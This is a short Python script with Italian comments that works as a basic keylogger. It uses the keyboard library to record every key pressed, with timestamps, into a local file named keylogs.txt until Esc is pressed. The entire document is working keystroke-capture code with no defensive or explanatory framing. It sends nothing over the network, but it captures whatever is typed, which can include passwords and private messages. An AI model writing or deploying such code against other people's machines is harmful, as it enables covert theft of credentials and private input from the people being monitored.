# Importo le librerie
import keyboard
import logging
# Variabili
logger = logging.getLogger(__name__)
logger.setLevel(logging.INFO)
file_handler = logging.FileHandler("keylogs.txt")
formatter = logging.Formatter(fmt="%(asctime)s: %(message)s",
                              datefmt="%d/%m/%Y %H:%M:%S")
file_handler.setFormatter(formatter)
logger.addHandler(file_handler)
# Definisci la funzione log_key_press
def log_key_press():
    key = keyboard.read_key()
    if key == 'esc':
        keyboard.read_key(suppress=True)
    else:
        logger.info(key)
# Inizia il ciclo while
while True:
    log_key_press()
    if keyboard.is_pressed('esc'):
        break